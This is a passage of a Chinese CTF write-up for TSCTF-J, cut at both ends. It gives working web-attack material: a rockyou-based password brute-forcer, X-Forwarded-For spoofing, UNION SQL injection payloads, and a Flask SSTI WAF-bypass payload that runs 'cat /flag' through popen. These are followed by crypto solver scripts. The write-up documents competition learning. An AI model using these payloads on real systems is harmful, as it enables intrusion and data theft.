class=\"string\">&#x27;captcha&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>.join(re.findall(<span class=\"string\">r&#x27;(?&lt;=captcha_images/)\\d(?=\\.png)&#x27;</span>, response.text))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = s.post(</span><br><span class=\"line\">        <span class=\"string\">&#x27;http://127.0.0.1:54655/login&#x27;</span>,</span><br><span class=\"line\">        cookies=cookies,</span><br><span class=\"line\">        headers=headers,</span><br><span class=\"line\">        data=data,</span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(re.findall(<span class=\"string\">f&#x27;&gt;.*?错误.*?&lt;&#x27;</span>, response.text))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;错误&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> response.text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, pwd <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:/PiYuanZhouLv/rockyou.txt&#x27;</span>)):</span><br><span class=\"line\">    pwd = pwd.strip()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> pwd.startswith(<span class=\"string\">&#x27;s&#x27;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(i, pwd)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> crack(pwd):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;THE PASSWORD IS&quot;</span>, pwd)</span><br><span class=\"line\">                exit()</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">import</span> time</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Have a rest!&#x27;</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>部分代码由<a href=\"https://curlconverter.com/\">https://curlconverter.com/</a>生成</p>\n<p>运行，得到密码”simple”，尝试登录，提示”非本地管理员”</p>\n<p><img src=\"/image-15.png\" alt=\"alt text\"></p>\n<p>由于wsrx，我们的请求的Referer&#x2F;Origin都是本地地址（就算wsrx会改那我们也无法控制），所以应该是X-Forwarded-For请求头，复制到HTTPie（或者你的请求软件），将X-Forwarded-For改为127.0.0.1</p>\n<p><img src=\"/image-16.png\" alt=\"alt text\"></p>\n<p>显示登陆成功，但是……我flag呢？！</p>\n<p>在这里卡了，直到后面伪造session的时候才知道这个token是有数据的，上<a href=\"https://www.jwt.io/\">https://www.jwt.io/</a>看看</p>\n<p><img src=\"/image-17.png\" alt=\"alt text\"></p>\n<p>看到flag了！</p>\n<p><box>TSCTF-J{w31c0m3_70_7h3_w38_j0urn3y}</box></p>\n<h3 id=\"web-EZ-SQL\"><a href=\"#web-EZ-SQL\" class=\"headerlink\" title=\"[web] EZ_SQL\"></a>[web] EZ_SQL</h3><p>上来先用通用密码 <code>&#39; or 1=1 #</code></p>\n<p>看到一大堆垃圾数据，和一个fleg（</p>\n<p><img src=\"/image-18.png\" alt=\"alt text\"></p>\n<p>好了，下面就是union注入的时候了</p>\n<p><img src=\"/image-19.png\" alt=\"alt text\"></p>\n<p>列数为三的时候没有报错，说明回显列为3</p>\n<p>查表名：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select group_concat(table_name) FROM</span></span><br><span class=\"line\"><span class=\"string\">information_schema.tables WHERE table_schema = database()) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-20.png\" alt=\"alt text\"></p>\n<p>发现flag这个表很有可能是我们的目标，查列名：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select group_concat(column_name) FROM</span></span><br><span class=\"line\"><span class=\"string\">information_schema.columns WHERE table_name=&#x27;</span>flag<span class=\"string\">&#x27;) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-21.png\" alt=\"alt text\"></p>\n<p>最后查flag</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select flag from flag) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-22.png\" alt=\"alt text\"></p>\n<p>诶诶，怎么炸了！经过搜索，发现是编码不一致导致的，所以</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; union select 1, 2, (select convert(flag using utf8) from flag) #</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-23.png\" alt=\"alt text\"></p>\n<p><box>TSCTF-J{sql_1nj3ct10n_m4573r}</box></p>\n<h3 id=\"web-EZ-PY\"><a href=\"#web-EZ-PY\" class=\"headerlink\" title=\"[web] EZ_PY\"></a>[web] EZ_PY</h3><p>上来先试注入什么的，无果，突然发现网页中的一行注释</p>\n<p><img src=\"/image-24.png\" alt=\"alt text\"></p>\n<p>访问&#x2F;source，获得源码</p>\n<p><img src=\"/image-25.png\" alt=\"alt text\"></p>\n<p>一个SSTI注入点，但是要admin的session，而且有waf</p>\n<p><img src=\"/image-26.png\" alt=\"alt text\"></p>\n<p>一段熟悉的套路代码（上周0xGame考了），可以原型链污染</p>\n<p><img src=\"/image-27.png\" alt=\"alt text\"></p>\n<p>所以，我们通过&#x2F;register进行原型链污染，把app.config[&#39;SECRET_KEY&#39;]改成一个已知值，然后伪造session，进行SSTI注入，获得flag</p>\n<p>下面开始：</p>\n<ol>\n<li>原型链污染<br>  <img src=\"/image-28.png\" alt=\"alt text\"></li>\n<li>session伪造+SSTI</li>\n</ol>\n<p>session伪造可以直接去前面提到的jwt.io上构造，现在就是SSTI和绕WAF了。</p>\n<p><img src=\"/image-29.png\" alt=\"alt text\"></p>\n<p>首先，注入符号被ban了，但是有hello hacker最后被替换</p>\n<p>然后把SSTI注入的关键词都ban的差不都了，但！是！下面那些过滤JavaScript的代码就有用了！比如__class__就可以写成__cl<span style=\"opacity:0.6;\">javascript:</span>ass__，不过为了过滤flask.g，它把所有带g的都！ban！掉！了！所以通过subclasses找到os._wrap_close再.__init__.__<span style=\"color: red;\">g</span>lobals__的路就GG了。虽然没办法直接拿到os，但是我们可以拿到__import__，然后.popen().read()就ok啦~</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hello &#x27;&#x27;.__clajavascript:ss__.__mrjavascript:o__[1].__subcljavascript:asses__()[141].__injavascript:it__.__builjavascript:tins__[&#x27;__impjavascript:ort__&#x27;](&#x27;ojavascript:s&#x27;).popjavascript:en(&#x27;cat /flag&#x27;).rejavascript:ad() hacker</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-30.png\" alt=\"alt text\"></p>\n<p>不对不对，fla<span style=\"color: red;\">g</span>还有一个g，改成fla?使用通配符就好了</p>\n<p><img src=\"/image-31.png\" alt=\"alt text\"></p>\n<p>ok，拿到flag~</p>\n<p><box>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}</box></p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"crypto-Cantor-s-gifts\"><a href=\"#crypto-Cantor-s-gifts\" class=\"headerlink\" title=\"[crypto] Cantor&#39;s gifts\"></a>[crypto] Cantor&#39;s gifts</h3><p>题目给出的hint是打乱后的某数后有多少个数比它小与阶乘相乘之和，所以先提取出复合前的这个数，再恢复乱序数列，最后恢复flag。</p>\n<p>一开始是通过模从小阶乘开始算的，不知道为什么不对，最后是从大阶乘整除恢复的，上代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint = <span class=\"number\">2498752981111460725490082182453813672840574</span></span><br><span class=\"line\">hint2 = <span class=\"string\">b&#x27;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"built_in\">len</span>(hint2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> functools</span><br><span class=\"line\"><span class=\"meta\">@functools.cache</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">f</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n &lt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> n * f(n-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">renum = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n-<span class=\"number\">1</span>):</span><br><span class=\"line\">    h = hint - <span class=\"built_in\">sum</span>([rn*f(n-<span class=\"number\">1</span>-j) <span class=\"keyword\">for</span> j, rn <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(renum)])</span><br><span class=\"line\">    rn = h // f(n-i-<span class=\"number\">1</span>)</span><br><span class=\"line\">    renum.append(rn)</span><br><span class=\"line\">renum = renum[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(renum)</span><br><span class=\"line\"></span><br><span class=\"line\">rebuilt = [<span class=\"number\">1</span>, <span class=\"number\">0</span>] <span class=\"keyword\">if</span> renum.pop(<span class=\"number\">0</span>) <span class=\"keyword\">else</span> [<span class=\"number\">0</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> rn <span class=\"keyword\">in</span> renum:</span><br><span class=\"line\">    nums = <span class=\"built_in\">list</span>(<span class=\"built_in\">sorted</span>(rebuilt))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> rn == <span class=\"number\">0</span>:</span><br><span class=\"line\">        rebuilt = [nums[<span class=\"number\">0</span>]-<span class=\"number\">1</span>] + rebuilt</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> rn == <span class=\"built_in\">len</span>(nums):</span><br><span class=\"line\">        rebuilt = [nums[-<span class=\"number\">1</span>]+<span class=\"number\">1</span>] + rebuilt</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        rebuilt = [(nums[rn-<span class=\"number\">1</span>]+nums[rn])/<span class=\"number\">2</span>] + rebuilt</span><br><span class=\"line\">mp = &#123;num: std <span class=\"keyword\">for</span> std, num <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">sorted</span>(rebuilt))&#125;</span><br><span class=\"line\">rebuilt = [mp[num] <span class=\"keyword\">for</span> num <span class=\"keyword\">in</span> rebuilt]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(rebuilt)</span><br><span class=\"line\"></span><br><span class=\"line\">msg = <span class=\"built_in\">bytearray</span>(hint2)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(rebuilt, hint2):</span><br><span class=\"line\">    msg[i] = c</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<p><box>TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}</box></p>\n<h3 id=\"crypto-Sign-in\"><a href=\"#crypto-Sign-in\" class=\"headerlink\" title=\"[crypto] Sign in\"></a>[crypto] Sign in</h3><p>很简单，考察异或的性质：$P\\bigoplus Q\\bigoplus P &#x3D; (P\\bigoplus P)\\bigoplus Q &#x3D; Q$</p>\n<p>给出代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64, functools</span><br><span class=\"line\"></span><br><span class=\"line\">base64.b64decode(<span class=\"built_in\">bytes</span>.fromhex(<span class=\"built_in\">hex</span>(functools.reduce(<span class=\"keyword\">lambda</span> x, y: x^y,</span><br><span class=\"line\"><span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> z: <span class=\"built_in\">int</span>(z, <span class=\"number\">16</span>),</span><br><span class=\"line\">[<span class=\"string\">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&#x27;</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&#x27;</span>])))[<span class=\"number\">2</span>:]))</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{I_like_Crypto}</box></p>\n<h3 id=\"crypto-p-q\"><a href=\"#crypto-p-q\" class=\"headerlink\" title=\"[crypto] p&#x3D;~q\"></a>[crypto] p&#x3D;~q</h3><p>与TSCTF-J2024 ezRSA的part3类似，p、q的特殊关系可以改写为p^q的值，然后就可以剪枝。之前ezRSA的时候自己写的程序就炸了，所以核心部分是从网上不记得哪个地方抄的了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543</span></span><br><span class=\"line\">c = <span class=\"number\">6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_pq</span>(<span class=\"params\">n, x</span>):</span><br><span class=\"line\">    a = [<span class=\"number\">0</span>]</span><br><span class=\"line\">    b = [<span class=\"number\">0</span>]</span><br><span class=\"line\">    maskx = <span class=\"number\">1</span></span><br><span class=\"line\">    maskn = <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1024</span>):</span><br><span class=\"line\">        xbit = (x &amp; maskx) &gt;&gt; i</span><br><span class=\"line\">        nbit = n % maskn</span><br><span class=\"line\">        t_a = []</span><br><span class=\"line\">        t_b = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(a)):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> aa <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">                <span class=\"keyword\">for</span> bb <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> aa ^ bb == xbit:</span><br><span class=\"line\">                        tmp2 = n % maskn</span><br><span class=\"line\">                        tmp1 = (aa * maskn // <span class=\"number\">2</span> + a[j]) * (bb * maskn // <span class=\"number\">2</span> + b[j]) % maskn</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> tmp1 == tmp2:</span><br><span class=\"line\">                            t_a.append(aa * maskn // <span class=\"number\">2</span> + a[j])</span><br><span class=\"line\">                            t_b.append(bb * maskn // <span class=\"number\">2</span> + b[j])</span><br><span class=\"line\">        maskx *= <span class=\"number\">2</span></span><br><span class=\"line\">        maskn *= <span class=\"number\">2</span></span><br><span class=\"line\">        a = t_a</span><br><span class=\"line\">        b = t_b</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a1, b1 <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(a, b):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a1 * b1 == n:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> a1, b1</span><br><span class=\"line\"></span><br><span class=\"line\">p, q = get_pq(n, <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;1&#x27;</span>*<span class=\"number\">1022</span>+<span class=\"string\">&#x27;0&#x27;</span>, <span class=\"number\">2</span>))</span><br><span class=\"line\">phi = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">d = <span class=\"built_in\">pow</span>(<span class=\"number\">0x10001</span>, -<span class=\"number\">1</span>, phi)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(<span class=\"built_in\">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{The_easiest_RSA_key!}</box></p>\n<h3 id=\"crypto-野狐禅\"><a href=\"#crypto-野狐禅\" class=\"headerlink\" title=\"[crypto] 野狐禅\"></a>[crypto] 野狐禅</h3><p>考察了Paillier加密体系，此处取$g &#x3D; n + 1$</p>\n<p>先看加密逻辑：</p>\n<p>$$<br>c &#x3D; {(g}^{m} \\times r^{n})\\ mod\\ n^{2} \\\\<br>&#x3D; \\left( (n + 1)^{m} \\times r^{n} \\right)\\ mod\\ n^{2} \\\\<br>&#x3D; \\left( (mn + 1) \\times r^{n} \\right)\\ mod\\ n^{2}<br>$$</p>\n<p>由于n、r都知道，所以</p>\n<p>$$m &#x3D; \\frac{\\frac{c}{r^{n}} - 1}{n}\\ mod\\ n^{2}$$</p>\n<p>可以直接解密（一开始走歪了，想到同态去了），由于懒了一下，是AI生成的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">from</span> sympy <span class=\"keyword\">import</span> Matrix</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;challenge.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        lines = f.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"built_in\">int</span>(lines[<span class=\"number\">0</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\">    g = <span class=\"built_in\">int</span>(lines[<span class=\"number\">1</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\">    k = <span class=\"built_in\">int</span>(lines[<span class=\"number\">2</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\">    eqs = <span class=\"built_in\">int</span>(lines[<span class=\"number\">3</span>].split(<span class=\"string\">&quot;: &quot;</span>)[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    ciphertexts = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>, <span class=\"number\">4</span> + <span class=\"number\">2</span> * k):</span><br><span class=\"line\">        ciphertexts.append(<span class=\"built_in\">int</span>(lines[i].strip()))</span><br><span class=\"line\">    </span><br><span class=\"line\">    raws = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span> + <span class=\"number\">2</span> * k, <span class=\"number\">4</span> + <span class=\"number\">4</span> * k):</span><br><span class=\"line\">        raws.append(<span class=\"built_in\">int</span>(lines[i].strip()))</span><br><span class=\"line\">    </span><br><span class=\"line\">    n2 = n * n</span><br><span class=\"line\">    y_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span> * k):</span><br><span class=\"line\">        c = ciphertexts[i]</span><br><span class=\"line\">        raw_val = raws[i]</span><br><span class=\"line\">        r = raw_val % n</span><br><span class=\"line\">        r_n = <span class=\"built_in\">pow</span>(r, n, n2)</span><br><span class=\"line\">        inv_r_n = <span class=\"built_in\">pow</span>(r_n, -<span class=\"number\">1</span>, n2)</span><br><span class=\"line\">        temp = (c * inv_r_n) % n2</span><br><span class=\"line\">        m_val = (temp - <span class=\"number\">1</span>) // n</span><br><span class=\"line\">        y_list.append(m_val)</span><br><span class=\"line\">    </span><br><span class=\"line\">    A = []</span><br><span class=\"line\">    b = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">        b.append(y_list[k + i])</span><br><span class=\"line\">        row = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">            row.append(y_list[k + i - <span class=\"number\">1</span> - j])</span><br><span class=\"line\">        A.append(row)</span><br><span class=\"line\">    </span><br><span class=\"line\">    A_mat = Matrix(A)</span><br><span class=\"line\">    b_mat = Matrix(b)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        x = A_mat.solve(b_mat)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Matrix is not invertible&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    coeffs = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">        val = x[i]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> val.is_Integer:</span><br><span class=\"line\">            coeffs.append(<span class=\"built_in\">int</span>(val))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            coeffs.append(<span class=\"built_in\">round</span>(<span class=\"built_in\">float</span>(val)))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> coeffs:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> [<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>]:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Warning: coefficient <span class=\"subst\">&#123;c&#125;</span> is not in [0,1,2]&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k):</span><br><span class=\"line\">        num += coeffs[i] * (<span class=\"number\">3</span> ** i)</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag = long_to_bytes(num)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag.decode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{We_sh0u1d_kn0w!}</box></p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"pwn-ret\"><a href=\"#pwn-ret\" class=\"headerlink\" title=\"[pwn] ret\"></a>[pwn] ret</h3><p>先静态分析，发现一个无限溢出和一个后门函数，直接上exp</p>\n<div><img src=\"image-32.png\" style=\"float: left;\"><img src=\"image-33.png\" style=\"float: left;\"></div>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 